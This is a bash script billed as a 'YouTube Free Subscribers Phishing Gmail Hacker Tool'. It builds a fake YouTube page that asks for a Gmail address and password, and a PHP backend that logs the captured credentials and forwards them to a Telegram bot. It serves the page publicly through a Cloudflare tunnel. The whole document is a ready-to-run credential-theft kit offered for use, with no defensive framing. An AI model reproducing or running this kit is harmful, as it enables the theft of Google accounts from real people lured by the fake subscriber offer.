#!/bin/bash

# YouTube Free Subscribers Phishing Gmail Hacker Tool
# Auto-generates phishing page, hosts via Cloudflare Tunnel, saves to phishing_links.txt

echo "🚀 Starting YouTube Subscribers Phishing Gmail Tool..."

# Create directory for project
mkdir -p ~/youtube_phish
cd ~/youtube_phish

# Step 1: Generate Phishing HTML Page (YouTube Free Subscribers)
cat > index.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free YouTube Subscribers - Instant 10K Subs!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); max-width: 450px; width: 90%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo img { width: 120px; height: auto; }
        h1 { color: #ff0000; text-align: center; margin-bottom: 10px; font-size: 28px; }
        .subtitle { color: #666; text-align: center; margin-bottom: 30px; font-size: 16px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #333; font-weight: 500; }
        input { width: 100%; padding: 15px; border: 2px solid #ddd; border-radius: 10px; font-size: 16px; transition: border-color 0.3s; }
        input:focus { outline: none; border-color: #ff0000; }
        .submit-btn { width: 100%; padding: 15px; background: linear-gradient(135deg, #ff0000, #cc0000); color: white; border: none; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; transition: transform 0.2s; }
        .submit-btn:hover { transform: translateY(-2px); }
        .features { margin-top: 30px; text-align: center; }
        .feature { display: inline-block; margin: 0 15px; color: #666; }
        .loading { display: none; text-align: center; color: #ff0000; font-weight: bold; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.youtube.com/s/desktop/0b3b4e79/img/favicon_144.png" alt="YouTube">
        </div>
        <h1>🎁 Get 10K Free Subscribers!</h1>
        <p class="subtitle">Verify your Google account to unlock instant subscribers</p>
        
        <form id="phishForm" action="save.php" method="POST">
            <div class="form-group">
                <label>Channel URL</label>
                <input type="url" name="channel" placeholder="https://youtube.com/@yourchannel" required>
            </div>
            <div class="form-group">
                <label>Gmail Address</label>
                <input type="email" name="email" placeholder="your@gmail.com" required>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" placeholder="Enter your Gmail password" required>
            </div>
            <button type="submit" class="submit-btn">🚀 Get Subscribers Now!</button>
        </form>
        
        <div id="loading" class="loading">Processing... Please wait ⏳</div>
        
        <div class="features">
            <div class="feature">✅ Instant Delivery</div>
            <div class="feature">✅ 100% Real Subs</div>
            <div class="feature">✅ No Password Share</div>
        </div>
    </div>

    <script>
        document.getElementById('phishForm').addEventListener('submit', function() {
            document.querySelector('.submit-btn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
        });
    </script>
</body>
</html>
EOF

# Step 2: Create PHP Backend to Capture Credentials
cat > save.php << 'EOF'
<?php
if ($_POST) {
    $email = $_POST['email'] ?? '';
    $pass = $_POST['password'] ?? '';
    $channel = $_POST['channel'] ?? '';
    
    // Log to file with timestamp
    $log = date('Y-m-d H:i:s') . " | Channel: $channel | Email: $email | Pass: $pass\n";
    file_put_contents('credentials.txt', $log, FILE_APPEND | LOCK_EX);
    
    // Send to Telegram (replace YOUR_BOT_TOKEN and YOUR_CHAT_ID)
    $botToken = 'YOUR_BOT_TOKEN_HERE';
    $chatId = 'YOUR_CHAT_ID_HERE';
    $message = urlencode("🆕 NEW HIT!\nChannel: $channel\nEmail: $email\nPass: $pass");
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$message");
    
    // Redirect to real YouTube
    header('Location: https://www.youtube.com');
    exit;
}
?>
EOF

# Step 3: Create index.php to serve HTML
cat > index.php << 'EOF'
<?php
header('Content-Type: text/html');
readfile('index.html');
?>
EOF

# Step 4: Download Cloudflared for tunnel
echo "📥 Downloading Cloudflared..."
if [[ "$OSTYPE" == "linux-gnu"* ]]; then
    wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
    chmod +x cloudflared
elif [[ "$OSTYPE" == "darwin"* ]]; then
    brew install cloudflared || echo "Install cloudflared manually: brew install cloudflared"
fi

# Step 5: Start PHP server and Cloudflare tunnel in background
echo "🌐 Starting PHP server on port 8080..."
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
PHP_PID=$!

echo "☁️ Creating Cloudflare tunnel..."
./cloudflared tunnel --url http://127.0.0.1:8080 > tunnel.log 2>&1 &
CF_PID=$!

sleep 10

# Get public URL from Cloudflare logs
PUBLIC_URL=$(grep -o 'https://.*\.trycloudflare.com' tunnel.log | head -1 || echo "https://tunnel-failed.trycloudflare.com")

# Save credentials logger setup instructions
cat > setup_telegram.txt << EOF
📱 SETUP TELEGRAM NOTIFICATIONS:

1. Create bot: @BotFather → /newbot → Get TOKEN
2. Get your Chat ID: @userinfobot
3. Edit save.php: Replace YOUR_BOT_TOKEN_HERE and YOUR_CHAT_ID_HERE

EOF

# Save phishing link to txt file
echo "🔗 PUBLIC PHISHING LINK: $PUBLIC_URL" | tee -a ~/phishing_links.txt
echo "📁 Credentials saved to: ~/youtube_phish/credentials.txt" | tee -a ~/phishing_links.txt
echo "📱 Telegram setup: ~/youtube_phish/setup_telegram.txt" | tee -a ~/phishing_links.txt
echo "🛑 Stop: kill $PHP_PID $CF_PID" | tee -a ~/phishing_links.txt
echo "" | tee -a ~/phishing_links.txt

echo ""
echo "✅ TOOL READY!"
echo "🌐 Phishing URL: $PUBLIC_URL"
echo "📱 Check ~/phishing_links.txt for all details"
echo "💾 Victims: ~/youtube_phish/credentials.txt"
echo "🛑 To stop: killall php cloudflared"

# Keep alive
wait
